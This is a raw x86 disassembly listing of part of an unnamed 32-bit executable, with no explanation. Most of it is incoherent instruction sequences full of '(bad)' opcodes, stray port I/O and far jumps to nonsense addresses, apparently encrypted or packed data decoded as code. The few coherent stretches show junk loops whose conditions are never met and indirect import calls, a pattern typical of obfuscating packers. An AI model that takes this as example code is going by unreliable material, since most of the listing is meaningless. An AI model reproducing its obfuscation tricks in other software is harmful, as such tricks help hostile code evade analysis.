  4059fd:	mov    ecx,0x8923ce5b
  405a02:	mov    cl,0xae
  405a04:	es jae 0x4059d6
  405a07:	cs je  0x405a10
  405a0a:	test   DWORD PTR [eax+0x3476b3b6],edi
  405a10:	cs xor eax,0x4a86a2c7
  405a16:	xor    ah,BYTE PTR [edi-0x5d]
  405a19:	mov    ecx,0xeb537d62
  405a1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a1f:	imul   BYTE PTR [eax]
  405a21:	gs adc al,0x9c
  405a24:	stc    
  405a25:	mov    cl,0x92
  405a27:	test   al,0x62
  405a29:	dec    esi
  405a2a:	and    DWORD PTR [esi-0x16],ebx
  405a2d:	outs   dx,DWORD PTR ds:[esi]
  405a2e:	sar    al,1
  405a30:	adc    DWORD PTR [ebx-0x2c8cb347],ebx
  405a36:	sub    eax,DWORD PTR [ebp-0xa118a95]
  405a3c:	aam    0x40
  405a3e:	sub    dl,BYTE PTR [ebx]
  405a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a41:	shr    esi,cl
  405a43:	jg     0x4059d6
  405a45:	and    eax,0x9b1cb54b
  405a4a:	push   0x44
  405a4c:	and    eax,0xc5aa27f0
  405a51:	icebp  
  405a52:	mov    edx,esp
  405a54:	push   eax
  405a55:	call   0xb9bbb8a0
  405a5a:	mov    edi,0x41cef8ab
  405a5f:	adc    BYTE PTR [eax-0x7ee76666],bl
  405a65:	loopne 0x405a3f
  405a67:	dec    ecx
  405a68:	jno    0x405acd
  405a6a:	call   0x1194:0x38e4de6b
  405a71:	in     eax,0x9c
  405a73:	xor    BYTE PTR [ecx],bh
  405a75:	or     eax,ecx
  405a77:	mov    ds:0xa839cb20,al
  405a7c:	or     eax,0x4cec08da
  405a81:	sbb    ebp,DWORD PTR [eax-0x33a2c2b3]
  405a87:	out    0x27,eax
  405a89:	cmp    eax,DWORD PTR [ebx+0x79]
  405a8c:	jmp    0x8285:0x649a972f
  405a93:	pop    eax
  405a94:	xor    eax,0x3aed165c
  405a99:	repz sub BYTE PTR [esi],dh
  405a9c:	mov    esp,0xdd905798
  405aa1:	nop
  405aa2:	fimul  WORD PTR [ecx+0x32bbd7cd]
  405aa8:	cmp    al,0xa3
  405aaa:	lds    eax,FWORD PTR [edx-0x4a]
  405aad:	loope  0x405a5b
  405aaf:	dec    esi
  405ab0:	scas   al,BYTE PTR es:[edi]
  405ab1:	xlat   BYTE PTR ds:[ebx]
  405ab2:	and    ch,BYTE PTR [esi-0x4650ef76]
  405ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ab9:	cwde   
  405aba:	mov    ?,edx
  405abc:	rcl    DWORD PTR [edx+0x25],0xab
  405ac0:	mov    eax,ds:0x2c700a87
  405ac5:	or     al,0x66
  405ac7:	iret   
  405ac8:	scas   eax,DWORD PTR es:[edi]
  405ac9:	lahf   
  405aca:	mov    ah,0xec
  405acc:	pop    ds
  405acd:	aas    
  405ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405acf:	dec    esp
  405ad0:	xchg   esi,eax
  405ad1:	and    eax,0x76d432e2
  405ad6:	push   edi
  405ad7:	stos   DWORD PTR es:[edi],eax
  405ad8:	xor    edi,DWORD PTR [eax]
  405ada:	clc    
  405adb:	push   edi
  405adc:	outs   dx,BYTE PTR ds:[esi]
  405add:	jg     0x405b04
  405adf:	and    cl,BYTE PTR [edx+0x7cd24c8c]
  405ae5:	jge    0x405ab8
  405ae7:	arpl   WORD PTR [eax+0x21],ax
  405aea:	push   eax
  405aeb:	inc    ebp
  405aec:	or     esi,DWORD PTR ds:0xf57e54d7
  405af2:	cmc    
  405af3:	jne    0x405af3
  405af5:	cmp    DWORD PTR ds:0x6290bd74,0xce5b005c
  405aff:	inc    edi
  405b00:	or     bl,BYTE PTR [eax]
  405b02:	sbb    DWORD PTR [edx+0xf32327f],ecx
  405b08:	jmp    0xe001:0xe3b6cc14
  405b0f:	jns    0x405ade
  405b11:	jg     0x405b3e
  405b13:	rol    eax,cl
  405b15:	add    DWORD PTR [esp+eiz*8-0x26],ecx
  405b19:	jnp    0x405b04
  405b1b:	sti    
  405b1c:	mov    ah,0xd5
  405b1e:	push   esp
  405b1f:	out    dx,eax
  405b20:	icebp  
  405b21:	rcl    DWORD PTR [bx+di],0x49
  405b25:	push   DWORD PTR [ebx]
  405b27:	inc    eax
  405b28:	inc    esp
  405b29:	lea    ebx,[edi+edx*2-0x5172cd35]
  405b30:	or     eax,esi
  405b32:	cli    
  405b33:	inc    ecx
  405b34:	int3   
  405b35:	adc    BYTE PTR [edx+0x59232295],dl
  405b3b:	mov    bl,0x45
  405b3d:	sub    DWORD PTR [eax-0x154a2ddb],esi
  405b43:	push   eax
  405b44:	in     al,0xb
  405b46:	push   esi
  405b47:	cmp    al,0x72
  405b49:	test   DWORD PTR [ebx],edx
  405b4b:	mov    edi,0xe26049c4
  405b50:	sub    eax,0xa5f8082b
  405b55:	dec    esp
  405b56:	sbb    dh,BYTE PTR ds:0x48d63a4f
  405b5c:	shl    BYTE PTR [esi-0xf],1
  405b5f:	mov    cs,WORD PTR [ebp-0x1689f626]
  405b65:	xor    ebp,DWORD PTR [esi-0x4055fe40]
  405b6b:	mov    dl,0x2
  405b6d:	test   ah,ch
  405b6f:	mov    dl,0x5c
  405b71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b72:	mov    ?,WORD PTR ds:0xfc681fe8
  405b78:	retf   
  405b79:	push   ss
  405b7a:	jle    0x405b4a
  405b7c:	inc    ecx
  405b7d:	adc    edx,edi
  405b7f:	mov    edx,0x778cfe85
  405b84:	ret    
  405b85:	cdq    
  405b86:	and    eax,0x2c2295cc
  405b8b:	test   ebp,esi
  405b8d:	push   edi
  405b8e:	cmp    dh,BYTE PTR [eax+0x6]
  405b91:	(bad)  
  405b92:	mov    fs,esp
  405b94:	mov    ch,0x49
  405b96:	xchg   DWORD PTR [ebp-0x3f066fa9],esi
  405b9c:	push   ds
  405b9d:	adc    al,0x4a
  405b9f:	mov    eax,0x1c69bd02
  405ba4:	xlat   BYTE PTR ds:[ebx]
  405ba5:	jle    0x405c01
  405ba7:	dec    edx
  405ba8:	mov    bl,0xab
  405baa:	ins    BYTE PTR es:[edi],dx
  405bab:	loope  0x405be9
  405bad:	cdq    
  405bae:	int    0x8b
  405bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bb1:	pop    eax
  405bb2:	push   esi
  405bb3:	cmp    DWORD PTR [ecx-0x3d],ecx
  405bb6:	loope  0x405b38
  405bb8:	rcl    BYTE PTR [esi+0x5edcf203],1
  405bbe:	addr16 retf 0x4f6f
  405bc2:	icebp  
  405bc3:	jnp    0x405bbe
  405bc5:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  405bc7:	and    eax,0x7e37fadc
  405bcc:	mov    ecx,esp
  405bce:	and    bl,al
  405bd0:	or     al,0x17
  405bd2:	adc    ah,BYTE PTR [esi-0x754f4581]
  405bd8:	push   ebp
  405bd9:	or     ch,BYTE PTR [edx]
  405bdb:	and    eax,0x2853526b
  405be0:	push   0x50
  405be2:	enter  0xd2a9,0x5
  405be6:	add    DWORD PTR [eax+0x70a7c6fe],0x10
  405bed:	(bad)  
  405bee:	pop    edx
  405bef:	cmp    al,0x1b
  405bf1:	(bad)  
  405bf2:	repz adc DWORD PTR [edx-0x41d9d926],esp
  405bf9:	dec    ecx
  405bfa:	es test ebx,esp
  405bfd:	test   DWORD PTR [ebx-0x67],ebp
  405c00:	dec    ebp
  405c01:	hlt    
  405c02:	jl     0x405b96
  405c04:	jle    0x405c62
  405c06:	in     al,dx
  405c07:	jnp    0x405c49
  405c09:	jp     0x405c57
  405c0b:	mov    esi,ecx
  405c0d:	ins    DWORD PTR es:[edi],dx
  405c0e:	shl    DWORD PTR [ecx+edi*4-0x5b],cl
  405c12:	xchg   ebx,eax
  405c13:	scas   al,BYTE PTR es:[edi]
  405c14:	test   al,0x4d
  405c16:	sbb    eax,0x5bfae296
  405c1b:	push   eax
  405c1c:	jge    0x405c32
  405c1e:	aas    
  405c1f:	aad    0xdc
  405c21:	sbb    BYTE PTR ds:0x25a4b6e4,ah
  405c27:	pop    ds
  405c28:	sbb    DWORD PTR [eax-0x6b],ebx
  405c2b:	enter  0xa321,0xd0
  405c2f:	out    0x1c,eax
  405c31:	sbb    BYTE PTR [ecx],ch
  405c33:	dec    ebp
  405c34:	add    edi,0xffffff80
  405c37:	jecxz  0x405c38
  405c39:	push   ecx
  405c3a:	cmp    dl,BYTE PTR [esi+0x7c]
  405c3d:	push   ebx
  405c3e:	sbb    eax,0x589b7c2a
  405c43:	imul   ebp,DWORD PTR [eax+0x1c956f8a],0xffffffdc
  405c4a:	jne    0x405c62
  405c4c:	outs   dx,DWORD PTR ds:[esi]
  405c4d:	test   eax,0xcb907e6e
  405c52:	or     BYTE PTR [ecx-0x4ee09e8b],bl
  405c58:	xchg   esp,eax
  405c59:	dec    BYTE PTR [ecx+ebp*4+0x22]
  405c5d:	sbb    eax,0x90fe7e1b
  405c62:	fmul   DWORD PTR [ecx-0x22b422b0]
  405c68:	mov    dl,0x9
  405c6a:	sbb    dh,dl
  405c6c:	dec    BYTE PTR [ebp+ebx*2-0x11d2f07]
  405c73:	push   esi
  405c74:	mov    eax,0xa70c565b
  405c79:	mov    DWORD PTR [ebp-0x1897ddf],esi
  405c7f:	sbb    ebp,eax
  405c81:	lock mov dl,0x1
  405c84:	push   ebx
  405c85:	into   
  405c86:	jnp    0x405c74
  405c88:	outs   dx,BYTE PTR ds:[esi]
  405c89:	mov    esi,0xe15e0589
  405c8e:	cmp    DWORD PTR [esi],0x70
  405c91:	hlt    
  405c92:	iret   
  405c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c94:	test   BYTE PTR [ebx+eiz*1-0x7a],bl
  405c98:	xchg   ebx,eax
  405c99:	or     BYTE PTR ds:0x36a0c5ef,dh
  405c9f:	xchg   DWORD PTR [ecx],edx
  405ca1:	inc    BYTE PTR [esi-0x23b916f9]
  405ca7:	out    dx,eax
  405ca8:	stc    
  405ca9:	push   esp
  405caa:	adc    bl,BYTE PTR [edi]
  405cac:	mul    BYTE PTR [edx]
  405cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405caf:	inc    ebx
  405cb0:	test   eax,0xb6e49776
  405cb5:	fsub   DWORD PTR [edx*1-0x2de97c9c]
  405cbc:	ficomp WORD PTR [ebx+ecx*2]
  405cbf:	mov    esp,0x3db0631c
  405cc4:	sbb    bl,al
  405cc6:	adc    DWORD PTR [edx+0xfc83b4b],0xffffff85
  405ccd:	adc    al,BYTE PTR [eax+eax*1]
  405cd0:	add    BYTE PTR [ecx],al
  405cd2:	adc    eax,0x43453f
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x434553,0x43457b
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43460f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x4345c7,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x434547,0x12
  405d19:	cmp    DWORD PTR ds:0x434547,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x434547,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x434547
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x434547,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0x44161bd6
  405d8d:	hlt    
  405d8e:	ja     0x405d45
  405d90:	cmp    al,0x7e
  405d92:	jle    0x405d58
  405d94:	jns    0x405e14
  405d96:	jle    0x405dfd
  405d98:	loopne 0x405dbf
  405d9a:	shl    cl,1
  405d9c:	das    
  405d9d:	mov    ebp,0xc6fc5065
  405da2:	shl    DWORD PTR [edx-0xb],cl
  405da5:	pop    ds
  405da6:	(bad)  
  405da7:	aas    
  405da8:	dec    ebp
  405da9:	cmp    dh,BYTE PTR [edi]
  405dab:	mov    ebp,0xb6567337
  405db0:	cli    
  405db1:	cmc    
  405db2:	stos   DWORD PTR es:[edi],eax
  405db3:	pop    ebx
  405db4:	xor    DWORD PTR [ebp-0x571b59aa],esp
  405dba:	and    DWORD PTR [eax+0x79],0x1e
  405dbe:	cld    
  405dbf:	jmp    DWORD PTR [esi]
  405dc1:	pop    eax
  405dc2:	outs   dx,DWORD PTR ds:[esi]
  405dc3:	lods   eax,DWORD PTR ds:[esi]
  405dc4:	lods   eax,DWORD PTR ds:[esi]
  405dc5:	scas   eax,DWORD PTR es:[edi]
  405dc6:	pop    ebx
  405dc7:	pop    esi
  405dc8:	inc    ecx
  405dc9:	(bad)  
  405dcb:	sub    eax,0xed69836e
  405dd0:	shr    DWORD PTR [eax+0x7e],cl
  405dd3:	jle    0x405df2
  405dd5:	jge    0x405d5f
  405dd7:	sahf   
  405dd8:	outs   dx,DWORD PTR ds:[esi]
  405dd9:	xchg   BYTE PTR ds:0xde65dda4,cl
  405ddf:	jns    0x405e34
  405de1:	mov    esi,0x7ae5222b
  405de6:	jecxz  0x405d71
  405de8:	xchg   DWORD PTR [ecx],ecx
  405dea:	js     0x405df5
  405dec:	cdq    
  405ded:	sti    
  405dee:	rcr    bl,0x94
  405df1:	or     DWORD PTR ds:0xcbcdcf44,ecx
  405df7:	popa   
  405df8:	mov    BYTE PTR ds:0xe5452f15,bh
  405dfe:	(bad)  
  405e00:	stos   BYTE PTR es:[edi],al
  405e01:	or     eax,0x8c00bced
  405e06:	leave  
  405e07:	sub    BYTE PTR [ebp-0x69a7ea20],0xb
  405e0e:	push   0xda198b
  405e13:	mov    edi,0xf8c0b51a
  405e18:	enter  0x44f4,0x7e
  405e1c:	jb     0x405e8a
  405e1e:	sbb    al,0x78
  405e20:	das    
  405e21:	adc    ah,BYTE PTR [esi]
  405e23:	inc    ecx
  405e24:	mov    ds:0xc054abea,al
  405e29:	dec    esp
  405e2a:	mov    al,ds:0x4395982a
  405e2f:	and    DWORD PTR [ebp-0x3f],edi
  405e32:	and    DWORD PTR [ebp-0x10],edi
  405e35:	leave  
  405e36:	inc    esp
  405e37:	mov    ds:0x9ad91e05,eax
  405e3c:	imul   DWORD PTR [edx]
  405e3e:	ss mov cl,0x65
  405e41:	test   DWORD PTR ds:0x1c674194,esi
  405e47:	push   ss
  405e48:	(bad)  
  405e49:	push   esi
  405e4a:	stc    
  405e4b:	ins    DWORD PTR es:[edi],dx
  405e4c:	push   ds
  405e4d:	idiv   cl
  405e4f:	dec    ebp
  405e50:	jl     0x405e01
  405e52:	xchg   al,ah
  405e54:	outs   dx,DWORD PTR ds:[esi]
  405e55:	mov    DWORD PTR ss:[eax],esi
  405e58:	gs ins BYTE PTR es:[edi],dx
  405e5a:	mov    ecx,0xeba12d6b
  405e5f:	mov    edi,0xbfe38cf8
  405e64:	js     0x405e39
  405e66:	add    edx,eax
  405e68:	mov    esp,0x161628d1
  405e6d:	pop    es
  405e6e:	loopne 0x405eb3
  405e70:	std    
  405e71:	out    0x58,al
  405e73:	and    esi,edi
  405e75:	sar    DWORD PTR [eax-0x424d1275],0x5e
  405e7c:	inc    ecx
  405e7d:	test   eax,0x34382c36
  405e82:	call   0x387acd5
  405e87:	mov    eax,ds:0x8f21ab0b
  405e8c:	rcl    BYTE PTR ds:0x512e1a2,0x26
  405e93:	add    BYTE PTR [ebp+edi*1-0x3f],cl
  405e97:	fnstenv [eax+esi*2+0x32]
  405e9b:	mov    al,0xa4
  405e9d:	or     edx,esp
  405e9f:	adc    DWORD PTR [eax],0x9211ca22
  405ea5:	xor    DWORD PTR ds:0xcaf069fa,eax
  405eab:	arpl   WORD PTR [ebx],ax
  405ead:	fwait
  405eae:	scas   al,BYTE PTR es:[edi]
  405eaf:	mov    BYTE PTR [ebp+eax*2+0x63],al
  405eb3:	fcom   st(5)
  405eb5:	jmp    DWORD PTR [ebp+0x59]
  405eb8:	ret    
  405eb9:	xor    ch,BYTE PTR [edi+0x601db167]
  405ebf:	adc    al,BYTE PTR [ebx]
  405ec1:	dec    esp
  405ec2:	jns    0x405eb9
  405ec4:	test   eax,0xaecf6337
  405ec9:	mov    cl,0x30
  405ecb:	or     BYTE PTR [esp+esi*2+0x60],0xff
  405ed0:	lahf   
  405ed1:	and    DWORD PTR [ebx],0xffffffa5
  405ed4:	loopne 0x405f1d
  405ed6:	hlt    
  405ed7:	xor    edx,esi
  405ed9:	mov    ?,eax
  405edb:	loope  0x405f24
  405edd:	fdivr  DWORD PTR [ebp-0xf9804f]
  405ee3:	adc    ah,BYTE PTR [eax]
  405ee5:	hlt    
  405ee6:	into   
  405ee7:	in     eax,dx
  405ee8:	sub    al,0xc6
  405eea:	enter  0x5822,0x3d
  405eee:	pop    ds
  405eef:	(bad)  
  405ef0:	and    al,0x96
  405ef2:	jmp    0xd3e1:0x3aa116fb
  405ef9:	test   eax,0x1fa833b1
  405efe:	test   eax,0x2bbc15d1
  405f03:	add    BYTE PTR [edx-0x78506d7f],bl
  405f09:	mov    ch,0x29
  405f0b:	sbb    DWORD PTR [ecx-0x60],ebx
  405f0e:	xor    edx,ecx
  405f10:	dec    edx
  405f11:	int3   
  405f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f13:	loope  0x405ef1
  405f15:	jl     0x405f1f
  405f17:	call   DWORD PTR [edi]
  405f19:	push   esi
  405f1a:	mov    DWORD PTR [edx],edi
  405f1c:	and    dh,ch
  405f1e:	xchg   BYTE PTR [edi-0x36],dl
  405f21:	mov    dh,0xff
  405f23:	outs   dx,DWORD PTR ds:[esi]
  405f24:	dec    ecx
  405f25:	add    ecx,DWORD PTR [ebx-0x5296eb62]
  405f2b:	xchg   edi,eax
  405f2c:	push   si
  405f2e:	jae    0x405edc
  405f30:	dec    esi
  405f31:	stos   DWORD PTR es:[edi],eax
  405f32:	mov    ds:0x45181048,eax
  405f37:	repz or al,0xab
  405f3a:	rcr    DWORD PTR [edx+ecx*8],1
  405f3d:	xchg   BYTE PTR [edi+0x1610338e],dl
  405f43:	cmp    BYTE PTR ds:0xed298ce4,bh
  405f49:	ret    0x66e5
  405f4c:	cmp    eax,0xd950f917
  405f51:	mov    esi,0x9c7ec350
  405f56:	mov    al,ds:0x7ae84027
  405f5b:	mov    bl,0x5e
  405f5d:	cmp    DWORD PTR [eax],ebx
  405f5f:	mov    cl,0x98
  405f61:	xchg   edi,eax
  405f62:	mov    ds:0x6ffe3db3,eax
  405f67:	mov    esi,0x9f68c40
  405f6c:	rcr    DWORD PTR [esi-0x7ad24c5],0x11
  405f73:	mov    BYTE PTR [eax-0x4c3b742c],0x90
  405f7a:	push   0x12
  405f7c:	sbb    al,0x3e
  405f7e:	call   0xa03286be
  405f83:	mov    ecx,0x55c63445
  405f88:	test   DWORD PTR ds:0x1ce301ac,edx
  405f8e:	nop
  405f8f:	xor    al,0x83
  405f91:	arpl   WORD PTR [ecx+0x332d9162],ax
  405f97:	iret   
  405f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f99:	pop    ecx
  405f9a:	or     DWORD PTR gs:[eax],esp
  405f9d:	sbb    BYTE PTR [ebp-0x408f8dde],bh
  405fa3:	loop   0x405f44
  405fa5:	je     0x405fa9
  405fa7:	aad    0xae
  405fa9:	mov    edi,0xa74636b6
  405fae:	sub    DWORD PTR [ebx-0x68],ecx
  405fb1:	stos   BYTE PTR es:[edi],al
  405fb2:	cmp    edi,0x40
  405fb5:	mov    edx,0xb5b169fb
  405fba:	jge    0x405ffa
  405fbc:	dec    edi
  405fbd:	inc    cx
  405fbf:	popf   
  405fc0:	sub    eax,0x297280f8
  405fc5:	pushf  
  405fc6:	push   cs
  405fc7:	test   al,0xe5
  405fc9:	push   esp
  405fca:	bound  esp,QWORD PTR [ecx-0x1e]
  405fcd:	jb     0x405f54
  405fcf:	cli    
  405fd0:	dec    ebx
  405fd1:	xor    eax,DWORD PTR [edi+0x3ddacd5f]
  405fd7:	in     al,dx
  405fd8:	push   es
  405fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fda:	call   0x86c5:0xc9acac1a
  405fe1:	mov    al,ds:0x4ba1bbde
  405fe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fe7:	mov    al,0x23
  405fe9:	cmp    BYTE PTR [edi+0x21442837],ah
  405fef:	cdq    
  405ff0:	or     eax,ecx
  405ff2:	fnstenv [edi+0x61d1699f]
  405ff8:	out    0x4f,al
  405ffa:	popa   
  405ffb:	inc    eax
  405ffc:	(bad)  [ebp-0x19]
  405fff:	pushf  
  406000:	dec    ebp
  406001:	adc    BYTE PTR [esi-0x55],cl
  406004:	sahf   
  406005:	arpl   WORD PTR [esi-0x3b],sp
  406008:	add    al,0xfd
  40600a:	sub    al,0xdc
  40600c:	sbb    edx,DWORD PTR [ebx-0x164d8e54]
  406012:	jmp    0x88ce45e7
  406017:	jge    0x406069
  406019:	jl     0x40600c
  40601b:	dec    ecx
  40601c:	je     0x40607b
  40601e:	clc    
  40601f:	inc    edx
  406020:	call   0x8e64:0xefabb12e
  406027:	and    BYTE PTR [ebx],0xf7
  40602a:	push   ss
  40602b:	sub    eax,DWORD PTR [ebx+0x2e5093c9]
  406031:	dec    eax
  406032:	mov    ch,0xeb
  406034:	mov    eax,0x49147ac
  406039:	fstp   DWORD PTR [ecx-0x6fbec47c]
  40603f:	fcom   QWORD PTR [eax-0x4c]
  406042:	bound  esp,QWORD PTR [eax+0x58]
  406045:	mov    ah,BYTE PTR [edx+0x1843738a]
  40604b:	ror    BYTE PTR [esi+0x59733e70],0x3b
  406052:	ror    BYTE PTR [ecx+esi*4+0x5804aadc],1
  406059:	fsub   st,st(3)
  40605b:	aad    0x5a
  40605d:	stos   BYTE PTR es:[edi],al
  40605e:	rol    BYTE PTR [esi],cl
  406060:	out    dx,eax
  406061:	fisttp WORD PTR [ebx-0x7af3adb6]
  406067:	ds (bad) 
  406069:	xor    BYTE PTR [ecx-0x59594aa8],bl
  40606f:	loop   0x406000
  406071:	jnp    0x40600f
  406073:	ss mov bh,0xe8
  406076:	lock push ecx
  406078:	sti    
  406079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40607a:	aam    0x2e
  40607c:	in     al,0x67
  40607e:	mov    ecx,0x48fafb69
  406083:	stos   DWORD PTR es:[edi],eax
  406084:	lea    esi,[eax-0xfa9418]
  40608a:	or     DWORD PTR [edx+0x17],ecx
  40608d:	inc    esi
  40608e:	and    eax,DWORD PTR [ecx+ebx*4+0x5b]
  406092:	mov    edx,0xf12c162b
  406097:	fcmovnb st,st(5)
  406099:	(bad)  
  40609a:	call   0xa570a733
  40609f:	inc    eax
  4060a0:	pushf  
  4060a1:	icebp  
  4060a2:	xor    al,bl
  4060a4:	and    ecx,DWORD PTR [ebx+0x7ae1de6c]
  4060aa:	sbb    al,0xf3
  4060ac:	loop   0x40606c
  4060ae:	repnz int3 
  4060b0:	or     cl,BYTE PTR [ecx+0x1a381231]
  4060b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060b7:	clc    
  4060b8:	xchg   esp,eax
  4060b9:	cdq    
  4060ba:	test   eax,0x3b52695c
  4060bf:	push   cs
  4060c0:	(bad)  [ebx+0x69]
  4060c3:	cs pop ebx
  4060c5:	pop    esi
  4060c6:	popf   
  4060c7:	add    al,0xed
  4060c9:	pop    ebx
  4060ca:	mov    ebp,0x45447f99
  4060cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060d0:	aaa    
  4060d1:	mov    ah,0xbb
  4060d3:	inc    ebx
  4060d4:	push   0xefeaab91
  4060d9:	or     al,0xd9
  4060db:	cmp    edi,edx
  4060dd:	je     0x405d65
  4060e3:	leave  
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x43456f
  406101:	mov    eax,ds:0x43461b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x434553,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x434553
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x434553,ecx
  40612c:	cmp    DWORD PTR ds:0x434553,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x434553,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x434537,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x43457b,0x0
  406168:	mov    ecx,DWORD PTR ds:0x43457b
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x43457b,ecx
  406175:	cmp    DWORD PTR ds:0x43457b,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x43457b,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x43457b
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x43457b,ecx
  4061a7:	cmp    DWORD PTR ds:0x43457b,0x1f
  4061ae:	jb     0x406168
  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	or     eax,0x73df1831
  4061ca:	aas    
  4061cb:	jle    0x40624b
  4061cd:	dec    edi
  4061ce:	jns    0x40624e
  4061d0:	jle    0x406172
  4061d2:	add    eax,0x21a5aaf8
  4061d7:	inc    edx
  4061d8:	loop   0x4061d1
  4061da:	dec    ebx
  4061db:	cmp    ebx,DWORD PTR [eax]
  4061dd:	xor    al,0xbe
  4061df:	(bad)  
  4061e0:	test   esi,edi
  4061e2:	leave  
  4061e3:	(bad)  
  4061e4:	mov    eax,0x6a437653
  4061e9:	sub    ecx,DWORD PTR [esi+edx*1+0x3f]
  4061ed:	inc    edi
  4061ee:	mov    ecx,0xe7c5f5ca
  4061f3:	fnstcw WORD PTR [ebx+0x35]
  4061f6:	or     DWORD PTR [edx],ecx
  4061f8:	dec    edi
  4061f9:	inc    esi
  4061fa:	jmp    DWORD PTR [eax]
  4061fc:	push   cs
  4061fd:	mov    ecx,DWORD PTR [edx-0x4d]
  406200:	stos   DWORD PTR es:[edi],eax
  406201:	xchg   DWORD PTR ds:0x4207a3e0,esi
  406207:	cli    
  406208:	xchg   ecx,eax
  406209:	adc    DWORD PTR [edi+0x20],ebx
  40620c:	int3   
  40620d:	mov    bl,0xfc
  40620f:	das    
  406210:	loop   0x40621a
  406212:	mov    bh,0xf0
  406214:	pop    ecx
  406215:	(bad)  
  406216:	hlt    
  406217:	jmp    0xaf18318
  40621c:	mov    esi,0xc9270e79
  406221:	add    edx,esi
  406223:	mov    dh,0xbd
  406225:	iret   
  406226:	sbb    eax,0xb657dbe3
  40622b:	inc    edx
  40622c:	inc    edi
  40622d:	lods   eax,DWORD PTR ds:[esi]
  40622e:	jecxz  0x406264
  406230:	cdq    
  406231:	ins    BYTE PTR es:[edi],dx
  406232:	inc    ecx
  406233:	mov    DWORD PTR [eax+0x64c23051],eax
  406239:	inc    ebx
  40623a:	in     eax,0x1d
  40623c:	(bad)  [ebx-0x4d]
  40623f:	not    DWORD PTR [ebp+0xfabd8bd]
  406245:	ror    ebp,1
  406247:	mov    ch,0x96
  406249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40624a:	push   cs
  40624b:	mov    ch,BYTE PTR [edx+eiz*8]
  40624e:	loopne 0x4062b0
  406250:	xchg   ebp,eax
  406251:	rol    eax,0x74
  406254:	popa   
  406255:	sti    
  406256:	sub    al,0x8
  406258:	iret   
  406259:	inc    esp
  40625a:	mov    ebp,DWORD PTR [edx+edi*2+0x34]
  40625e:	xchg   ebp,eax
  40625f:	int    0x36
  406261:	pop    es
  406262:	scas   al,BYTE PTR es:[edi]
  406263:	cmp    ebx,DWORD PTR [eax-0x4f]
  406266:	test   dh,bl
  406268:	sti    
  406269:	in     eax,dx
  40626a:	jae    0x406262
  40626c:	sub    BYTE PTR [eax+edx*4+0x34c16518],bh
